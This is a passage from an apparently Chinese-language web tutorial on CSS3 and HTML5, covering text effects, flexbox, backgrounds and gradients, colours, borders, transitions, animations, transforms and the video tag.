<li>`指定文本装饰的样式。</li>
</ul>
</li>
<li><code>text-decoration-color</code>：
<ul>
<li>`指定文本装饰的颜色。</li>
</ul>
</li>
<li><code>blink</code>： 指定文字的装饰是闪烁。  <code>opera</code>和<code>firefox</code></li>
<li><code>text-decoration</code> : <code>#F00 double overline</code>   <code>CSS3</code>实例</li>
</ul>
</li>
<li>
<p><strong><code>text-shadow</code>:文本阴影</strong></p>
<ul>
<li>取值：<code>x</code> <code>y</code>   <code>blur</code> <code>color</code>,…
<ul>
<li><code>x</code>  	横向偏移</li>
<li><code>y</code>   	纵向偏移</li>
<li><code>blur</code>     模糊距离(灰度)</li>
<li><code>color</code>    阴影颜色</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>text-fill-color</code>:文字填充颜色</p>
</li>
<li>
<p><code>text-stroke</code>:复合属性。设置文字的描边</p>
<ul>
<li><code>text-stroke-width</code>:文字的描边厚度</li>
<li><code>text-stroke-color</code>:文字的描边颜色</li>
</ul>
</li>
<li>
<p><code>tab-size</code>:制表符的长度</p>
<ul>
<li>默认值为<code>8</code>(一个<code>tab</code>键的空格字节长度)，在	<code>pre</code>标签之内才会有显示</li>
</ul>
</li>
<li>
<p><code>word-wrap</code>:当前行超过指定容器的边界时是否断开转行</p>
<ul>
<li><code>normal</code>： 默认值</li>
<li>允许内容顶开或溢出指定的容器边界。</li>
</ul>
</li>
<li>
<p><code>break-word</code>：</p>
<ul>
<li>内容将在边界内换行。如果需要，单词内部允许断行</li>
</ul>
</li>
</ul>
<h3 id="第五课-css3盒模型"><a class="markdownIt-Anchor" href="#第五课-css3盒模型"></a> 第五课 CSS3盒模型</h3>
<hr />
<ul>
<li>CSS盒模型复习</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-320bad065d62c499.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="标准盒子模型" /></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-693242e2f03506f8.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IE盒子模型" /></p>
<h4 id="css3弹性盒模型"><a class="markdownIt-Anchor" href="#css3弹性盒模型"></a> CSS3弹性盒模型</h4>
<ul>
<li>
<p><strong>以下6个属性设置在容器上</strong></p>
<ul>
<li><code>flex-direction</code></li>
<li><code>flex-wrap</code></li>
<li><code>flex-flow</code></li>
<li><code>justify-content</code></li>
<li><code>align-items</code></li>
<li><code>align-content</code></li>
</ul>
</li>
<li>
<p><strong>属性详解</strong></p>
<ul>
<li><code>flex-direction: row</code> | <code>row-reverse</code> | <code>column</code> | <code>column-reverse</code>;</li>
<li><code>flex-wrap: nowrap</code> | <code>wrap</code> | <code>wrap-reverse</code>;</li>
<li><code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code>
<ul>
<li><code>flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;</code>;</li>
</ul>
</li>
<li><code>justify-content</code>属性定义了项目在主轴上的对齐方式。
<ul>
<li><code>justify-content: flex-start</code> | <code>flex-end</code> | <code>center</code> | <code>space-between</code> | <code>space-around</code>;</li>
</ul>
</li>
<li><code>align-items</code>属性定义项目在交叉轴上如何对齐。
<ul>
<li><code>align-items: flex-start</code> | <code>flex-end</code> | <code>center</code> | <code>baseline</code> | <code>stretch</code>;</li>
</ul>
</li>
<li><code>align-content</code>属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。
<ul>
<li><code>align-content: flex-start</code> | <code>flex-end</code> | <code>center</code> | <code>space-between</code> | <code>space-around</code> | <code>stretch</code>;</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>以下6个属性设置在项目上</strong></p>
<ul>
<li><code>order</code></li>
<li><code>flex-grow</code></li>
<li><code>flex-shrink</code></li>
<li><code>flex-basis</code></li>
<li><code>flex</code></li>
<li><code>align-self</code></li>
</ul>
</li>
<li>
<p><strong>属性详解</strong></p>
<ul>
<li><code>order</code>属性定义项目的排列顺序。数值越小，排列越靠前，默认为<code>0</code></li>
<li><code>flex-grow</code>属性定义项目的放大比例，默认为<code>0</code>，即如果存在剩余空间，也不放大。</li>
<li><code>flex-shrink</code>属性定义了项目的缩小比例，默认为<code>1</code>，即如果空间不足，该项目将缩小。</li>
<li><code>flex-basis</code>属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为<code>auto</code>，即项目的本来大小。</li>
<li><code>flex</code>属性是<code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code>的简写，默认值为<code>0 1 auto</code>。后两个属性可选。</li>
<li><code>align-self</code>属性允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性。默认值为<code>auto</code>，表示继承父元素的<code>align-items</code>属性，如果没有父元素，则等同于<code>stretch</code>。
<ul>
<li><code>align-self: auto</code> | <code>flex-start</code> | <code>flex-end</code> | <code>center</code> | <code>baseline</code> | <code>stretch</code>;</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-885b1d526653b87d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flex布局语法篇小结" /></p>
<ul>
<li>拓展阅读
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">flex布局语法篇</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html" target="_blank" rel="noopener">flex布局实例篇</a></li>
</ul>
</li>
</ul>
<h3 id="第六课-css3新增背景属性"><a class="markdownIt-Anchor" href="#第六课-css3新增背景属性"></a> 第六课 css3新增背景属性</h3>
<hr />
<ul>
<li>
<p><strong>CSS背景属性复习</strong></p>
<ul>
<li><code>background</code>:
<ul>
<li><code>background-color</code>:背景颜色</li>
<li><code>background-image</code>:背景图片</li>
<li><code>background-repeat</code>:背景重复</li>
<li><code>background-position</code>:背景定位</li>
<li><code>background-attachment</code>:背景固定(<code>scroll/fixed)</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>CSS3新增背景属性</strong></p>
</li>
<li>
<p><code>background-size</code>  背景尺寸</p>
<ul>
<li><code>background-size:x y</code> 水平 垂直方向的尺寸，像素/百分比/auto/…</li>
<li><code>background-size:100% 100%</code></li>
<li><code>background-size:cover</code> 比例放大</li>
<li><code>background-size:contain</code> 包含（图片不溢出）</li>
</ul>
</li>
<li>
<p>多背景</p>
<ul>
<li><code>background-image:url(1.jpg),url(2.jpg)</code>;</li>
</ul>
</li>
<li>
<p><code>background-origin</code> 背景区域定位</p>
<ul>
<li><code>border-box</code>： 从<code>borde</code>r区域开始显示背景。</li>
<li><code>padding-box</code>： 从<code>padding</code>区域开始显示背景。</li>
<li><code>content-box</code>： 从<code>content</code>内容区域开始显示背</li>
</ul>
</li>
<li>
<p><code>background-clip</code>   背景绘制区域</p>
<ul>
<li><code>border-box</code>： 从<code>border</code>区域向外裁剪背景。</li>
<li><code>padding-box</code>： 从<code>padding</code>区域向外裁剪背景。</li>
<li><code>content-box</code>： 从<code>content</code>区域向外裁剪背景。</li>
</ul>
</li>
<li>
<p><code>text</code>:背景填充文本</p>
<ul>
<li><code>no-clip</code>： 从<code>border</code>区域向外裁剪背景</li>
</ul>
</li>
<li>
<p><strong>颜色渐变</strong></p>
<ul>
<li>
<p><strong>线性渐变</strong>：<code>linear-gradient</code>(起点/角度，颜色 位置，…,)</p>
<ul>
<li>
<p>起点：<code>left/top/right/bottom/left top......</code>默认<code>top</code></p>
</li>
<li>
<p>角度：逆时针方向 <code>0-360</code>度</p>
</li>
<li>
<p>颜色 位置：<code>red 50%</code>, <code>blue 100%</code>(红色从50%渐变到100%为蓝色)</p>
</li>
<li>
<p><code>repeating-linear-gradient</code>  线性渐变重复平铺</p>
<ul>
<li><code>IE</code>低版本渐变(滤镜)：</li>
<li><code>filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#ff0000',GradientType='1');</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>径向渐变</strong>：<code>radial-gradient</code>(起点(圆心位置), 形状/半径/大小，颜色1，颜色2)</p>
<ul>
<li>起点：<code>left/top/right/bottom</code>或具体值/百分比</li>
<li>形状：<code>ellipse</code>(椭圆)、<code>circle</code>(正圆)</li>
<li>大小：具体数值或百分比，也可以是关键字（<code>closest-side</code>(最近端), <code>closest-corner</code>最近角), <code>farthest-side</code>(最远端), f<code>arthest-corner</code>(最远角), <code>contain</code>(包含) ,<code>cover</code>(覆盖)）;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第七课-css3新增颜色属性"><a class="markdownIt-Anchor" href="#第七课-css3新增颜色属性"></a> 第七课 css3新增颜色属性</h3>
<hr />
<ul>
<li>
<p><strong>CSS颜色属性复习</strong></p>
<ul>
<li><code>color name</code>    颜色英文名称命名</li>
<li><code>HEX</code>方式         十六进制方式</li>
<li><code>rgb</code>方式           三原色配色方式</li>
</ul>
</li>
<li>
<p><strong>CSS3新增颜色属性</strong></p>
<ul>
<li><strong><code>rgba()</code></strong></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>颜色</th>
<th>颜色</th>
<th>取值</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>red</td>
<td>红色</td>
<td>0-255</td>
</tr>
<tr>
<td>g</td>
<td>green</td>
<td>绿色</td>
<td>0-255</td>
</tr>
<tr>
<td>b</td>
<td>blue</td>
<td>蓝色</td>
<td>0-255</td>
</tr>
<tr>
<td>a</td>
<td>alpha</td>
<td>透明</td>
<td>0-1</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong><code>HSL</code>模式  <code>HSLA</code>模式</strong></p>
<ul>
<li>
<p><code>H</code>： <code>Hue</code>(色调)。</p>
<ul>
<li>0(或360)表示红色，120表示绿色，240表示蓝色，也可取其他数值来指定颜色。取值为：<code>0 - 360</code></li>
</ul>
</li>
<li>
<p><code>S</code>：<code>Saturation</code>(饱和度)。取值为：0.0% - 100.0%</p>
</li>
<li>
<p><code>L</code>： <code>Lightness</code>(亮度)。取值为：0.0% - 100.0%</p>
</li>
<li>
<p><code>A</code>:    <code>alpha</code>   透明度   0~1之间</p>
</li>
<li>
<p>语法:<code>HSLA(H,S,L,A)</code></p>
</li>
</ul>
</li>
<li>
<p>HSL色轮</p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-e966854f01e64406.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="HSL色轮" /></p>
<ul>
<li>
<p>透明颜色：<code>transparent</code></p>
<ul>
<li>实例：<code>border</code>实现三角箭头、风车等</li>
</ul>
</li>
<li>
<p>透明度：</p>
<ul>
<li><code>opacity</code></li>
<li>取值：<code>0-1</code>之间</li>
<li>注：低版本的<code>IE</code>浏览器不兼容,需用IE浏览器的滤镜实现相同效果，<code>filter:alpha(opacity=50)</code></li>
<li>对于低版本的火狐浏览器需添加内核前缀，<code>-moz-opacity</code></li>
</ul>
</li>
</ul>
<h3 id="第八课-css3边框系列"><a class="markdownIt-Anchor" href="#第八课-css3边框系列"></a> 第八课 CSS3边框系列</h3>
<hr />
<h4 id="圆角-阴影"><a class="markdownIt-Anchor" href="#圆角-阴影"></a> 圆角-阴影</h4>
<hr />
<ul>
<li>
<p>边框圆角</p>
<ul>
<li>在<code>CSS2</code>中添加圆角矩形需要技巧。我们必须为每个圆角使用不同的图片</li>
<li>在 <code>CSS3</code>中，创建圆角是非常容易的</li>
<li>在<code>CSS3</code>中，<code>border-radius</code>属性用于创建圆角</li>
</ul>
</li>
<li>
<p><strong><code>border-radius</code>边框圆角写法</strong></p>
<ul>
<li><code>border-radius: 2em 1em 4em / 0.5em 3em;</code></li>
<li>等价于</li>
</ul>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">  <span class="selector-tag">border-top-left-radius</span>: 2<span class="selector-tag">em</span> 0<span class="selector-class">.5em</span>;</span><br><span class="line">  <span class="selector-tag">border-top-right-radius</span>: 1<span class="selector-tag">em</span> 3<span class="selector-tag">em</span>;</span><br><span class="line">  <span class="selector-tag">border-bottom-right-radius</span>: 4<span class="selector-tag">em</span> 0<span class="selector-class">.5em</span>;</span><br><span class="line">  <span class="selector-tag">border-bottom-left-radius</span>: 1<span class="selector-tag">em</span> 3<span class="selector-tag">em</span>;</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> **`<span class="selector-tag">box-shadow</span>`方框添加阴影**</span><br><span class="line">    <span class="selector-tag">-</span> 语法：`<span class="selector-tag">box-shadow</span><span class="selector-pseudo">:x-shadow</span> <span class="selector-tag">y-shadow</span> <span class="selector-tag">blur</span> <span class="selector-tag">spread</span> <span class="selector-tag">color</span> <span class="selector-tag">inset</span>;`</span><br><span class="line">    </span><br><span class="line">    <span class="selector-tag">-</span> **<span class="selector-tag">box-shadow</span>的<span class="selector-tag">API</span>**</span><br><span class="line">        <span class="selector-tag">-</span> `<span class="selector-tag">x-shadow</span>	` 必需。水平阴影的位置。允许负值。	</span><br><span class="line">        <span class="selector-tag">-</span> `<span class="selector-tag">y-shadow</span>` 	必需。垂直阴影的位置。允许负值。	</span><br><span class="line">        <span class="selector-tag">-</span> `<span class="selector-tag">blur</span>	` 	可选。模糊距离。	</span><br><span class="line">        <span class="selector-tag">-</span> `<span class="selector-tag">spread</span>` 	可选。阴影的尺寸。	</span><br><span class="line">        <span class="selector-tag">-</span> `<span class="selector-tag">color</span>` 	可选。阴影的颜色。请参阅 `<span class="selector-tag">CSS</span> `颜色值	</span><br><span class="line">        <span class="selector-tag">-</span> `<span class="selector-tag">inset</span>` 	可选。将外部阴影 (`<span class="selector-tag">outset</span>`) 改为内部阴影</span><br><span class="line">    <span class="selector-tag">-</span> 实例：`<span class="selector-tag">box-shadow</span><span class="selector-pseudo">:10px</span> 10<span class="selector-tag">px</span> 5<span class="selector-tag">px</span> 5<span class="selector-tag">px</span> <span class="selector-id">#888888</span>;`</span><br><span class="line">    </span><br><span class="line">#### 边框系列<span class="selector-tag">-</span>图片</span><br><span class="line"><span class="selector-tag">---</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> **`<span class="selector-tag">border-image</span>`语法**</span><br><span class="line"></span><br><span class="line">|属性|	版本|	简介|</span><br><span class="line">|---|---|---|</span><br><span class="line">|border-image|	CSS3|	设置或检索对象的边框使用图像来填充|</span><br><span class="line">|border-image-source| CSS3|设置或检索对象的边框是否用图像定义样式或图像来源路径|</span><br><span class="line">|border-image-slice|	CSS3|	设置或检索对象的边框背景图的分割方式|</span><br><span class="line">|border-image-width|	CSS3|	设置或检索对象的边框厚度|</span><br><span class="line">|border-image-outset|	CSS3|	设置或检索对象的边框背景图的扩展|</span><br><span class="line">|border-image-repeat|	CSS3|	设置或检索对象的边框图像的平铺方式|</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> **`<span class="selector-tag">border-image-slice</span>`**</span><br><span class="line">  <span class="selector-tag">-</span> 设置或检索对象的边框背景图的分割方式</span><br><span class="line">  </span><br><span class="line">![Paste_Image.png](http://upload-images.jianshu.io/upload_images/1480597-b6daa34d69905a1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> **`<span class="selector-tag">border-image-repeat</span>`**</span><br><span class="line">  <span class="selector-tag">-</span> 用于指定边框背景图的重复方式</span><br><span class="line">  <span class="selector-tag">-</span> 取值：</span><br><span class="line">    <span class="selector-tag">-</span> `<span class="selector-tag">stretch</span>`： 指定用拉伸方式来填充边框背景图。 *默认的</span><br><span class="line">    <span class="selector-tag">-</span> `<span class="selector-tag">repeat</span>`： 指定用平铺方式来填充边框背景图。当图片碰到边界时，如果超过则被截断。 </span><br><span class="line">    <span class="selector-tag">-</span> `<span class="selector-tag">round</span>`： 指定用平铺方式来填充边框背景图。图片会根据边框的尺寸动态调整图片的大小	直至正好可以铺满整个边框。写本文档时仅<span class="selector-tag">Firefox</span>能看到该效果 </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">### 第九课 <span class="selector-tag">CSS3</span>运动体系</span><br><span class="line"><span class="selector-tag">---</span></span><br><span class="line"></span><br><span class="line">#### 过渡</span><br><span class="line"><span class="selector-tag">---</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> 过渡：给改变添加过程</span><br><span class="line">    <span class="selector-tag">-</span> 什么是过渡</span><br><span class="line">    <span class="selector-tag">-</span> 过渡效果由哪几部分组成</span><br><span class="line">    <span class="selector-tag">-</span> 过渡可以干些什么</span><br><span class="line">    </span><br><span class="line"><span class="selector-tag">-</span> `<span class="selector-tag">transition</span>` 过渡属性</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> `<span class="selector-tag">transition</span>: <span class="selector-tag">property</span> <span class="selector-tag">duration</span> <span class="selector-tag">timing-function</span> <span class="selector-tag">delay</span>`;</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">transition-property</span>:`过渡属性的名称</span><br><span class="line">    	<span class="selector-tag">-</span> `<span class="selector-tag">none</span> `  没有过渡属性</span><br><span class="line">    	<span class="selector-tag">-</span> `<span class="selector-tag">all</span>  `      所有属性都过渡(默认值)</span><br><span class="line">    	<span class="selector-tag">-</span> `<span class="selector-tag">property</span> `   具体属性名称(`<span class="selector-tag">property1</span>`,`<span class="selector-tag">property2</span>`...)</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">transition-duration</span>:`过渡属性花费的时间</span><br><span class="line">	    <span class="selector-tag">-</span> `<span class="selector-tag">time</span> `  秒或毫秒</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">transition-timing-function</span>:`过渡效果速度曲线</span><br><span class="line">	    <span class="selector-tag">-</span> `<span class="selector-tag">time</span> `  秒或毫秒</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">transition-delay</span>:`过渡效果延迟时间</span><br><span class="line">    </span><br><span class="line"><span class="selector-tag">-</span> **`<span class="selector-tag">transition-timing-function</span>`:过渡效果速度曲线**</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">linear</span>`:规定以相同速度开始至结束的过渡效果（等于 `<span class="selector-tag">cubic-bezier</span>(0,0,1,1)`）。</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">ease</span>`:规定慢速开始，然后变快，然后慢速结束的过渡效果（`<span class="selector-tag">cubic-bezier</span>(0<span class="selector-class">.25</span>,0<span class="selector-class">.1</span>,0<span class="selector-class">.25</span>,1)`）。</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">ease-in</span>`:规定以慢速开始的过渡效果（等于 `<span class="selector-tag">cubic-bezier</span>(0<span class="selector-class">.42</span>,0,1,1)`）。</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">ease-out</span>`	:规定以慢速结束的过渡效果（等于 `<span class="selector-tag">cubic-bezier</span>(0,0,0<span class="selector-class">.58</span>,1)`）。</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">ease-in-out</span>` :规定以慢速开始和结束的过渡效果（等于 `<span class="selector-tag">cubic-bezier</span>(0<span class="selector-class">.42</span>,0,0<span class="selector-class">.58</span>,1)`）。</span><br><span class="line">	<span class="selector-tag">-</span> `<span class="selector-tag">cubic-bezier</span>(<span class="selector-tag">n</span>,<span class="selector-tag">n</span>,<span class="selector-tag">n</span>,<span class="selector-tag">n</span>)`:在 `<span class="selector-tag">cubic-bezier</span>` 函数中定义自己的值。可能的值是 `0 `至 `1` 之间的数值。</span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">-</span> 过渡完成事件   </span><br><span class="line">![过渡完成事件](http://upload-images.jianshu.io/upload_images/1480597-f8a2291a249961ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> `<span class="selector-tag">Webkit</span>`内核：</span><br><span class="line"></span><br><span class="line">```<span class="selector-tag">javascript</span></span><br><span class="line">  obj.addEventListener('webkitTransitionEnd',function()&#123;&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>标准:</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj.addEventListener(<span class="string">'transitionend'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="动画"><a class="markdownIt-Anchor" href="#动画"></a> 动画</h4>
<hr />
<ul>
<li>
<p>什么是<code>CSS3</code> 动画？</p>
<ul>
<li>通过 <code>CSS3</code>，我们能够创建动画，这可以在许多网页中取代动画图片、<code>Flash</code> 动画以及 <code>JavaScript</code></li>
</ul>
</li>
<li>
<p><strong>动画接口</strong></p>
</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>@keyframes</td>
<td>规定动画。</td>
</tr>
<tr>
<td>animation</td>
<td>所有动画属性的简写属性，除了 animation-play-state 属性。</td>
</tr>
<tr>
<td>animation-name</td>
<td>规定 @keyframes 动画的名称。</td>
</tr>
<tr>
<td>animation-duration</td>
<td>规定动画完成一个周期所花费的秒或毫秒。</td>
</tr>
<tr>
<td>animation-timing-function</td>
<td>规定动画的速度曲线。</td>
</tr>
<tr>
<td>animation-delay</td>
<td>规定动画何时开始。</td>
</tr>
<tr>
<td>animation-iteration-count</td>
<td>规定动画被播放的次数。</td>
</tr>
<tr>
<td>animation-direction</td>
<td>规定动画是否在下一周期逆向地播放。</td>
</tr>
<tr>
<td>animation-play-state</td>
<td>规定动画是否正在运行或暂停。</td>
</tr>
<tr>
<td>animation-fill-mode</td>
<td>规定对象动画时间之外的状态。</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>animation-timing-function速度曲线</strong></li>
</ul>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>linear</td>
<td>动画从头到尾的速度是相同的。</td>
</tr>
<tr>
<td>ease</td>
<td>默认。动画以低速开始，然后加快，在结束前变慢。</td>
</tr>
<tr>
<td>ease-in</td>
<td>动画以低速开始。</td>
</tr>
<tr>
<td>ease-out</td>
<td>动画以低速结束。</td>
</tr>
<tr>
<td>ease-in-out</td>
<td>动画以低速开始和结束。</td>
</tr>
<tr>
<td>cubic-bezier(n,n,n,n)</td>
<td>在 cubic-bezier 函数中自己的值。可能的值是从 0 到 1 的数值。</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>在谷歌浏览器里面需要加上<code>-webkit-</code><br />
<code>IE6,7,8,9</code>不支持<code>css3</code>运动</p>
</li>
<li>
<p>拓展阅读</p>
<ul>
<li><a href="http://note.youdao.com/noteshare?id=c4f5a977a7b3aa256a3c28aa64d6f989" target="_blank" rel="noopener">CSS3动画简介</a></li>
</ul>
</li>
<li>
<p><strong>CSS3盒模型阴影</strong></p>
<ul>
<li><code>box-shadow:inset x y blur spread color</code></li>
<li><code>inset</code>：投影方式</li>
<li><code>inset</code>：内投影</li>
<li><code>outset</code>：外投影 默认(不能设置)</li>
<li><code>x</code>、<code>y</code>：阴影偏移</li>
<li><code>blur</code>：模糊半径（灰度）</li>
<li><code>spread</code>：扩展阴影半径</li>
<li>先扩展原有形状，再开始画阴影</li>
<li><code>color</code></li>
</ul>
</li>
<li>
<p><strong><code>CSS3</code>盒模型倒影</strong></p>
</li>
<li>
<p><code>box-reflect</code> 倒影</p>
<ul>
<li>方向 <code>above|below|left|right;</code></li>
<li>距离</li>
<li>渐变（可选）</li>
</ul>
</li>
<li>
<p><strong>CSS3其他盒模型</strong></p>
<ul>
<li><code>box-sizing</code> 盒模型解析模式</li>
<li><code>content-box</code>  标准盒模型(和<code>css2</code>一样的计算)</li>
<li><code>width/height=border+padding+content</code></li>
<li><code>border-box</code> 怪异盒模型<code>width/height</code>与设置的值一样 ，<code>content</code>减小</li>
</ul>
</li>
<li>
<p>扩展阅读</p>
<ul>
<li><a href="http://www.jianshu.com/p/e2eb0d8c9de6" target="_blank" rel="noopener">学会使用css3的box-sizing布局</a></li>
</ul>
</li>
</ul>
<h3 id="第十课-transform-2d转换"><a class="markdownIt-Anchor" href="#第十课-transform-2d转换"></a> 第十课 transform 2D转换</h3>
<hr />
<ul>
<li>
<p><strong><code>Css3</code>平面转换方法</strong></p>
<ul>
<li><code>translate()</code>		移动</li>
<li><code>rotate()</code>		旋转</li>
<li><code>scale()</code>		缩放</li>
<li><code>skew()</code>		翻转</li>
<li><code>matrix()</code>	矩阵</li>
</ul>
</li>
<li>
<p><strong>transform</strong>:</p>
<ul>
<li><code>rotate()</code>  旋转函数 (deg)
<ul>
<li><code>deg</code>  度数</li>
</ul>
</li>
<li><code>skew(X,Y)</code> 倾斜函数 (deg)
<ul>
<li><code>skewX()</code></li>
<li><code>skewY()</code></li>
</ul>
</li>
<li><code>scale(X,Y)</code> 缩放函数 (正数、负数和小数)
<ul>
<li><code>scaleX()</code></li>
<li><code>scaleY()</code></li>
</ul>
</li>
<li><code>translate(X,Y)</code> 位移函数(px)
<ul>
<li><code>translateX()</code></li>
<li><code>translateY()</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>rotate()</code> 旋转方法</strong></p>
<ul>
<li>用于旋转元素角度</li>
<li>例：<code>rotate(30deg)</code>
<ul>
<li>把元素顺时针旋转 30 度</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>translate()</code>位置方法</strong></p>
<ul>
<li>用于移动元素位置
<ul>
<li>例：<code>translate(50px,100px)</code>
<ul>
<li>把元素从左侧移动 50 像素，从顶端移动 100 像素。</li>
</ul>
</li>
</ul>
</li>
<li>其实有些类似于我们的相对定位</li>
</ul>
</li>
<li>
<p><strong><code>scale()</code>尺寸方法</strong></p>
<ul>
<li>方法用于改变元素尺寸
<ul>
<li>例：<code>scale(2,4)</code>
<ul>
<li>把宽度转换为原始尺寸的 2 倍，把高度转换为原始高度的 4 倍</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>skew()</code> 翻转方法</strong></p>
<ul>
<li>通过 <code>skew()</code>方法，元素翻转给定的角度</li>
<li>例：<code>transform: skew(30deg,20deg);</code>
<ul>
<li>把元素围绕 <code>X</code>轴把元素翻转<code>30</code> 度，围绕 <code>Y</code> 轴翻转 <code>20</code>度</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第十一课-transform-3d转换"><a class="markdownIt-Anchor" href="#第十一课-transform-3d转换"></a> 第十一课 transform 3D转换</h3>
<hr />
<ul>
<li>
<p><strong><code>Css3</code>立体转换</strong></p>
<ul>
<li><code>transform-style（preserve-3d）</code> 建立<code>3D</code>空间（指定元素的子元素展示的场景是在3D场景还是平面(投影)场景）</li>
<li><code>Perspective</code> 视角（指定观察者与z=0平面的距离，从而让元素及子元素看起来有3D透视位置效果<br />
值：集体的带单位数值）</li>
<li><code>Perspective- origin</code> 视角基点
<ul>
<li>值：取值类似于变换基准</li>
</ul>
</li>
<li><code>transform-origin</code>：坐标轴基点（变换基准）
<ul>
<li>值：具体的坐标值/百分比/(<code>left</code>/<code>right</code>/<code>center</code>/<code>top</code>/<code>bottom</code>)<br />
默认 <code>center center</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>transform 新增函数</strong></p>
<ul>
<li><code>rotateX()</code></li>
<li><code>rotateY()</code></li>
<li><code>rotateZ()</code></li>
<li><code>translateZ()</code></li>
<li><code>scaleZ()</code></li>
</ul>
</li>
</ul>
<h3 id="第十二课-视频音频"><a class="markdownIt-Anchor" href="#第十二课-视频音频"></a> 第十二课 视频音频</h3>
<hr />
<ul>
<li>视频音频格式的简单介绍
<ul>
<li>常见的视频格式
<ul>
<li>视频的组成部分：画面、音频、编码格式</li>
<li>视频编码：H.264、Theora、VP8(google开源)</li>
</ul>
</li>
<li>常见的音频格式
<ul>
<li>视频编码：ACC、MP3、Vorbis</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="html5支持的格式"><a class="markdownIt-Anchor" href="#html5支持的格式"></a> <strong><code>HTML5</code>支持的格式</strong></h4>
<hr />
<ul>
<li><code>HTML5</code>能在完全脱离插件的情况下播放音视频,但是不是所有格式都支持。</li>
<li><strong>支持的视频格式：</strong>
<ul>
<li><code>Ogg=</code>带有<code>Theora</code>视频编码<code>+Vorbis</code>音频编码的<code>Ogg</code>文件</li>
<li><code>MEPG4=</code>带有H.264视频编码<code>+AAC</code>音频编码的<code>MPEG4</code>文件</li>
<li><code>WebM=</code>带有<code>VP8</code>视频编码<code>+Vorbis</code>音频编码的<code>WebM</code>格式</li>
</ul>
</li>
</ul>
<h4 id="video的使用"><a class="markdownIt-Anchor" href="#video的使用"></a> <code>Video</code>的使用</h4>
<hr />
<ul>
<li><strong>单独用法</strong>
<ul>
<li><code>&lt;video src=&quot;文件地址&quot; controls=&quot;controls&quot;&gt;&lt;/video&gt;</code></li>
</ul>
</li>
<li><strong>带提示用法</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt; <span class="attr">video</span> <span class="attr">src</span>=<span class="string">"文件地址"</span> <span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span></span><br><span class="line">	您的浏览器暂不支持video标签。播放视频</span><br><span class="line"><span class="tag">&lt;/ <span class="attr">video</span> &gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>兼容用法</strong></li>
</ul>
